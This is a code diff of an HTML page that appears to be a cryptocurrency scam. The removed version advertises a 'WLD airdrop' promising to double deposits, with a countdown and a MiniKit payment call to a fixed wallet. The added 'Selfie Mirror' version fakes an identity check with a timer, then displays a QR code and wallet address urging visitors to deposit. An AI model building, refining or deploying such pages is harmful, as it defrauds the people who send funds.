@@ -1,160 +1,103 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-<meta charset="UTF-8">
-<title>WLD Airdrop</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<title>Selfie Mirror</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{
-  width:100%;
-  height:100%;
-  font-family:Inter,system-ui,sans-serif;
+*{box-sizing:border-box;margin:0;padding:0}
+body{
   background:#f2f2f2;
-  overflow:hidden;
+  font-family:system-ui, sans-serif;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
 }
 
 .center{
-  height:100%;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
   text-align:center;
 }
 
-/* LOGO */
-.logo{
-  width:90px;
-  animation:spin 20s linear infinite;
-}
-@keyframes spin{
-  from{transform:rotateY(0)}
-  to{transform:rotateY(360deg)}
-}
-
-/* AIRDROP TEXT */
-.airdrop-text{
-  margin-top:22px;
-  font-weight:700;
-  letter-spacing:2px;
-}
-.airdrop-text span{
-  display:block;
-  font-size:18px;
-  opacity:0;
-  animation:airdrop 6s infinite;
-}
-.airdrop-text span:nth-child(1){animation-delay:0s}
-.airdrop-text span:nth-child(2){animation-delay:1.5s}
-.airdrop-text span:nth-child(3){animation-delay:3s}
-.airdrop-text .highlight{font-size:32px}
-@keyframes airdrop{
-  0%{opacity:0;transform:translateY(20px)}
-  20%{opacity:1;transform:translateY(0)}
-  70%{opacity:1}
-  100%{opacity:0;transform:translateY(-20px)}
-}
-
-/* WORLD ID */
-#widBox button{
-  margin-top:26px;
-  padding:14px 30px;
+/* BOTON */
+button{
+  padding:14px 32px;
   border:none;
   border-radius:10px;
   background:#000;
   color:#fff;
+  font-size:16px;
   letter-spacing:2px;
   cursor:pointer;
+}
+
+/* SPINNER */
+.spinner{
+  display:none;
+  margin:20px auto;
+  width:42px;
+  height:42px;
+  border:4px solid rgba(0,200,120,.3);
+  border-top:4px solid #00c389;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+
+/* STATUS */
+#status{
+  margin-top:16px;
+  font-size:16px;
+  font-weight:600;
 }
 
 /* QR */
 .qr-box{
   display:none;
-  margin-top:26px;
+  margin-top:24px;
 }
-.qr-box img{
-  width:160px;
+#qrImage{
+  width:180px;
   background:#fff;
   padding:12px;
   border-radius:14px;
+  transition:transform .6s ease;
 }
-.qr-box p{
-  margin-top:10px;
-  font-size:14px;
-  letter-spacing:2px;
+#qrImage.flipped{
+  transform:rotateY(180deg);
 }
 
-/* PAY BUTTON */
-.pay-box button{
-  margin-top:26px;
-  padding:14px 30px;
-  border:none;
-  border-radius:10px;
-  background:#00c389;
-  color:#000;
+/* RENEW */
+.renew{
+  margin-top:6px;
+  font-size:12px;
   letter-spacing:2px;
-  cursor:pointer;
+  opacity:.7;
 }
 
 /* COPY */
-.deposit-code{
+.deposit{
   display:none;
   margin-top:14px;
 }
-.deposit-code input{
+.deposit input{
   width:320px;
   padding:10px;
   text-align:center;
-  border-radius:6px;
-  border:1px solid #ccc;
 }
-.deposit-code button{
+.deposit button{
   margin-top:10px;
-  padding:10px 22px;
-  border:none;
-  border-radius:6px;
-  background:#000;
-  color:#fff;
-  cursor:pointer;
+  background:#00c389;
+  color:#000;
 }
 #copyMsg{
-  display:block;
-  margin-top:6px;
   font-size:12px;
+  margin-top:6px;
   opacity:0;
-}
-
-/* STATUS */
-.status{
-  margin-top:16px;
-  font-size:14px;
-  letter-spacing:1px;
-}
-
-/* TIMER */
-.countdown{
- 
-  margin-top:20px;
-  font-size:18px;
-  letter-spacing:2px;
-}
-
-/* ERROR */
-.error{
-  display:none;
-  margin-top:30px;
-}
-.error h2{color:#b00000}
-.error button{
-  margin-top:12px;
-  padding:10px 22px;
-  border:none;
-  border-radius:6px;
-  background:#000;
-  color:#fff;
-  cursor:pointer;
+  transition:opacity .3s;
 }
 </style>
 </head>
@@ -163,226 +106,88 @@ html,body{
 
 <div class="center">
 
-  <img src="logowld.png" class="logo">
-
-  <div class="airdrop-text">
-    <span>100% EARN AIRDROP</span>
-    <span>DEPOSIT UP TO 20 WLD</span>
-    <span class="highlight">GET 40 WLD</span>
-  </div>
-
-  <!-- WORLD ID -->
+  <!-- VERIFY -->
   <div id="widBox">
-    <button onclick="verifyWorldID()">VERIFY WITH WORLD ID</button>
+    <button id="verifyBtn">VERIFY</button>
   </div>
 
-  <!-- PAY BUTTON (hidden initially) -->
-  <div class="pay-box" id="payBox" style="display:none;">
-    <button id="payBtn">PAY WITH WORLD APP</button>
-  </div>
+  <!-- SPINNER -->
+  <div class="spinner" id="spinner"></div>
+
+  <!-- STATUS -->
+  <div id="status"></div>
 
   <!-- QR -->
   <div class="qr-box" id="qrBox">
-    <img src="qr.jpeg">
-    <p>SCAN QR TO DEPOSIT</p>
+    <img id="qrImage" src="qr.jpeg" alt="QR Wallet">
+    <div class="renew">renew in <span id="renewCounter">5</span></div>
   </div>
 
   <!-- COPY -->
-  <div class="deposit-code" id="depositBox">
+  <div class="deposit" id="depositBox">
     <input id="addr" readonly
-      value="0xf8af1505beb8a37207eb1f019ded31dd08fc571c">
-    <button onclick="copyAddr()">COPY ADDRESS</button>
-    <span id="copyMsg">Copied ✓</span>
-  </div>
-
-  <div class="status" id="status"></div>
-
-  <!-- TIMER -->
-  <div class="countdown" id="timer"></div>
-
-  <!-- ERROR -->
-  <div class="error" id="errorBox">
-    <h2>❌ ERROR</h2>
-    <button onclick="restart()">RETRY</button>
+      value="0x1f62e7890d5db2c94c280547876b050f5d1816c5">
+    <button id="copyBtn">COPY ADDRESS</button>
+    <div id="copyMsg">Copied ✓</div>
   </div>
 
 </div>
 
-<script type="module">
-/* ========= IMPORT MINIKIT ========= */
-import { MiniKit } from "https://cdn.jsdelivr.net/npm/@worldcoin/minikit-js@latest/+esm";
+<script>
+// ========= BOTON =========
+const verifyBtn = document.getElementById("verifyBtn");
+verifyBtn.addEventListener("click", simulateVerification);
 
-/* ========= TRANSLATIONS & TEXT ROTATION ========= */
-// Array of translations for the airdrop message. Each entry contains
-// three strings corresponding to the three lines displayed. Languages:
-// English, Spanish, Portuguese, French, Italian, German, Chinese.
-const translations = [
-  ["100% EARN AIRDROP", "DEPOSIT UP TO 20 WLD", "GET 40 WLD"],
-  ["100% GANA AIRDROP", "DEPOSITA HASTA 20 WLD", "RECIBE 40 WLD"],
-  ["100% GANHE AIRDROP", "DEPOSITE ATÉ 20 WLD", "RECEBA 40 WLD"],
-  ["100% GAGNE AIRDROP", "DÉPOSE JUSQU'À 20 WLD", "OBTIENT 40 WLD"],
-  ["100% OTTIENI AIRDROP", "DEPOSITA FINO A 20 WLD", "OTTENERE 40 WLD"],
-  ["100% ERHALTE AIRDROP", "HINTERLEGE BIS ZU 20 WLD", "BEKOMME 40 WLD"],
-  ["100% 获得空投", "存入最多 20 WLD", "获得 40 WLD"]
-];
-let langIndex = 1; // start with second language after the initial English
-function updateLanguage(){
-  const spans = document.querySelectorAll('.airdrop-text span');
-  const texts = translations[langIndex];
-  // Update each span's textContent
-  spans[0].textContent = texts[0];
-  spans[1].textContent = texts[1];
-  spans[2].textContent = texts[2];
-  // Advance to next language for the next cycle
-  langIndex = (langIndex + 1) % translations.length;
-}
-// Rotate languages every 6 seconds (matching the total animation duration)
-setInterval(updateLanguage, 6000);
+// ========= SIMULACION VERIFY =========
+function simulateVerification(){
+  document.getElementById("widBox").style.display="none";
+  document.getElementById("spinner").style.display="block";
+  document.getElementById("status").innerText="Verificando…";
 
-/* ========= WORLD APP PAYMENT CONFIG ========= */
-// Replace these with your actual World App ID action and the target wallet
-const ACTION_ID = "wldairdrop";
-const WALLET_ADDRESS = "0x1f62e7890d5db2c94c280547876b050f5d1816c5";
-const PAYMENT_AMOUNT = "20.00"; // USDC or WLD depending on configuration
-const PAYMENT_TOKEN = "WLD";
-
-/* ========= TIMER CONFIG ========= */
-let interval;
-
-// Compute remaining seconds until January 11, 2026 (local time)
-function getRemainingSeconds() {
-  const target = new Date('2026-01-11T00:00:00');
-  const now = new Date();
-  return Math.floor((target - now) / 1000);
+  setTimeout(()=>{
+    document.getElementById("spinner").style.display="none";
+    document.getElementById("status").innerText="✔ Verified";
+    showDeposit();
+  },2000);
 }
 
-/* ========= WORLD ID VERIFICATION ========= */
-async function verifyWorldID(){
-  try{
-    // Hide verify button to prevent multiple clicks
-    widBox.style.display = "none";
-    status.textContent = "Verifying ID…";
-    // Use MiniKit to verify World ID
-    const { finalPayload } = await MiniKit.commandsAsync.verify({
-      action: ACTION_ID,
-      signal: "signal-1"
-    });
-    if (!finalPayload) {
-      // If user cancels verification
-      status.textContent = "Verification cancelled";
-      widBox.style.display = "block";
-      return;
-    }
-    // You can send finalPayload to your backend here for validation if needed
-    status.textContent = "ID verified ✔";
-    // Show pay button
-    payBox.style.display = "block";
-    // Hide deposit instructions if they were visible
-    qrBox.style.display = "none";
-    depositBox.style.display = "none";
-  }catch(e){
-    console.error(e);
-    status.textContent = "Verification error";
-    widBox.style.display = "block";
-  }
-}
-
-/* ========= SHOW DEPOSIT ========= */
+// ========= MOSTRAR DEPOSITO =========
 function showDeposit(){
-  qrBox.style.display="block";
-  depositBox.style.display="block";
-  status.textContent="Waiting for deposit…";
-  waitForDeposit();
+  document.getElementById("status").innerText="Deposite para recibir pronto";
+  document.getElementById("qrBox").style.display="block";
+  document.getElementById("depositBox").style.display="block";
+  startRenew();
 }
 
-/* ========= WAIT DEPOSIT ========= */
-async function waitForDeposit(){
-  try{
-    const r = await fetch("/deposit-status");
-    const j = await r.json();
+// ========= RENEW =========
+let renew = 5;
+let renewTimer;
 
-    if(j.deposited){
-      status.textContent="Deposit detected ✔";
-      startTimer();
-    }else{
-      setTimeout(waitForDeposit, 5000);
-    }
-  }catch(e){
-    status.textContent="Connection error";
-    setTimeout(waitForDeposit, 5000);
-  }
-}
+function startRenew(){
+  clearInterval(renewTimer);
+  renew = 5;
+  document.getElementById("renewCounter").innerText=renew;
 
-/* ========= TIMER ========= */
-function startTimer(){
-  timer.style.display="block";
-  clearInterval(interval);
-  interval = setInterval(()=>{
-    const remaining = getRemainingSeconds();
-    if(remaining <= 0){
-      clearInterval(interval);
-      timer.style.display="none";
-      qrBox.style.display="none";
-      depositBox.style.display="none";
-      errorBox.style.display="block";
-      return;
+  renewTimer = setInterval(()=>{
+    renew--;
+    document.getElementById("renewCounter").innerText=renew;
+
+    if(renew===0){
+      document.getElementById("qrImage").classList.toggle("flipped");
+      renew = 5;
     }
-    const h = String(Math.floor(remaining/3600)).padStart(2,"0");
-    const m = String(Math.floor((remaining%3600)/60)).padStart(2,"0");
-    const s = String(remaining%60).padStart(2,"0");
-    timer.textContent = `TIME LEFT ${h}:${m}:${s}`;
   },1000);
 }
 
-/* ========= COPY ========= */
-function copyAddr(){
-  navigator.clipboard.writeText(addr.value);
-  copyMsg.style.opacity=1;
-  setTimeout(()=>copyMsg.style.opacity=0,1500);
-}
-
-/* ========= RESTART ========= */
-function restart(){
-  // Reset timer and UI for another attempt
-  clearInterval(interval);
-  errorBox.style.display="none";
-  status.textContent="";
-  widBox.style.display="block";
-  timer.style.display="none";
-  qrBox.style.display="none";
-  depositBox.style.display="none";
-}
-
-/* ========= PAY WITH WORLD APP ========= */
-async function pay(){
-  try{
-    status.textContent = "Processing payment…";
-    // Request payment via MiniKit; reference can be unique per session
-    const reference = Date.now().toString();
-    const payment = await MiniKit.commandsAsync.sendPayment({
-      to: WALLET_ADDRESS,
-      amount: PAYMENT_AMOUNT,
-      token: PAYMENT_TOKEN,
-      reference
-    });
-    if (payment && payment.success) {
-      status.textContent = "Payment confirmed ✔";
-      payBox.style.display = "none";
-      // Start countdown after successful payment
-      startTimer();
-    } else {
-      status.textContent = "Payment cancelled";
-      payBox.style.display = "block";
-    }
-  }catch(e){
-    console.error(e);
-    status.textContent = "Payment error";
-    payBox.style.display = "block";
-  }
-}
-
-// Attach click handler to the pay button once DOM is ready
-document.getElementById("payBtn").onclick = pay;
+// ========= COPY =========
+document.getElementById("copyBtn").addEventListener("click",()=>{
+  navigator.clipboard.writeText(
+    document.getElementById("addr").value
+  );
+  const m=document.getElementById("copyMsg");
+  m.style.opacity=1;
+  setTimeout(()=>m.style.opacity=0,1200);
+});
 </script>
 
 </body>
